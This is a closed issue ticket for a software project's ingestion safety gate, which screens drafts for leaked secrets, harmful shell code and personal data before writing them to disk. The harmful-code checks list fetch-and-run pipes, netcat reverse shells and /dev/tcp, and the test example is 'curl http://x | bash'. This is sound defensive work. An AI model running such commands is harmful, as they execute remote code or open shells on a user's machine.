---
id: 0011
title: Ingestion safety gate — secret / harmful-code / PII screening before write
status: closed
severity: high
group: 0009
depends_on: []
forgejo: 101
links:
  adr:
  prs: []
  issues: []
  regression:
assets: []
---

## Summary
The owner's core pre-deploy concern (SECURITY_ANALYSIS.md Facet 2, P0): nothing
should reach disk unscreened. A shared gate in `internal/ingest` scans every
`record_experience` draft **and** every importer-emitted draft, at/just-before
`Prepare`, so both write paths are covered.

## Scope
- [ ] **Secret scan:** gitleaks-style ruleset — known token shapes (AWS, GitHub,
      JWT, generic `api_key=`/`-----BEGIN … KEY-----`) + a high-entropy heuristic —
      over title, body, `error_signatures`, `resolution`. Pure function, testable.
- [ ] **Harmful-code heuristics:** flag `curl … | bash`/`wget … | sh`, `nc`/
      reverse shells, `/dev/tcp`, `base64 -d | sh`, suspicious URLs in
      `resolution`/`guard`/body.
- [ ] **PII (P1):** emails, IPs, internal hostnames in text fields.
- [ ] **On-hit policy:** additive `provenance.security_flags []string` (schema +
      `internal/record`, optional, stays `schema_version: 1`). A hit forces
      `quarantined` + records the flag(s); it can **never** be promoted to
      `validated` while flagged. Configurable reject-vs-flag; default flag.
- [ ] Wire the gate into both the importer (`runIngest`) and `record_experience`.

## Acceptance
- [ ] A draft containing an AWS-key-shaped string is flagged (not silently stored);
      guarding test.
- [ ] A `fix` containing `curl http://x | bash` is flagged; guarding test.
- [ ] A flagged record cannot reach `validated` (validator/doctor enforces).

## Notes
Pure-core/thin-edges: the scanners are pure (`internal/ingest` or a new
`internal/screen`); the edges already do the I/O. Dogfood: file an experience
record for any real hazard the gate catches.
